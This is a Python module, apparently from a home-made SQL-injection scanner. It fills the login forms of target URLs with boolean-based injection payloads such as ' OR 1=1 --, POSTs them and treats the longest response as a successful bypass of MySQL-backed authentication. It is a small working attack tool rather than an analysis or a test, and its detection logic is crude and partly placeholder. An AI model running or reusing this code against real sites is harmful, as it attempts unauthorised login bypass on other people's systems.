import os

from utils.ainsi import *
from utils.objects.vuln_link import *
from utils.objects.success_obj import *
from urllib.parse import urlparse


def write_into_file(string, filepath):
    data_folder_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "../../data/")
    os.makedirs(data_folder_path, exist_ok=True)
    with open(data_folder_path + filepath, 'a') as file:
        file.write(string)
    
boolean_based_payloads = {
    "' OR 1=1 -- ", '" OR 1=1 -- ', "' OR '1'='1", '" OR "1"="1'
}


import requests
from bs4 import BeautifulSoup

def post_boolean_based_injection(url, identified_db):
    pages_content = []
    
    for payload in boolean_based_payloads:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        inputs = soup.find_all('input')
        input_data = {}
        for i, input in enumerate(inputs):
            if "input" in str(input) and ('type="password"' in str(input) or 'type="text"' in str(input)):
                if i == 0:
                    input_data[input.get('name', f'input_{i}')] = payload
                else:
                    input_data[input.get('name', f'input_{i}')] = "pass"
            
        # print(input_data)
        response = requests.post(url, data=input_data)
        pages_content.append(response.text)
        
    biggest_content = ""
    for page_content in pages_content:
        if len(page_content) > len(biggest_content):
            biggest_content = page_content

    print(biggest_content)
    if biggest_content == "":
        return False, None
    return True, biggest_content

def post_injection(vuln_links, output_file):
    
    
    for vuln_link in vuln_links:
        try :
            identified_db, link, query_params, success = vuln_link.get_infos()
            
            print(f"🔴 {colored('Injection:', RED, styles=BOLD)} {colored(link, CYAN, styles=BOLD)}")
            
            if (identified_db.lower() == "mysql"):
                success, content = post_boolean_based_injection(link, identified_db)
                if (success == True):
                    print(f"{colored('🟢 Injection:', YELLOW, styles=BOLD)} {colored(identified_db, GREEN, styles=BLINK)} > {colored('BOOLEAN BASED', MAGENTA, styles=BOLD)} ✅")
                    write_into_file('cc biloute', output_file)
                else:
                    print(f"{colored('🔴 Injection:', YELLOW, styles=BOLD)} {colored(identified_db, GREEN, styles=BLINK)} > {colored('BOOLEAN BASED', MAGENTA, styles=BOLD)} ❌")
                
            
            # print(success)

        except Exception as e:
            print(f"{colored('ERROR INJECTION : ', RED, styles=UNDERLINE)} {e}")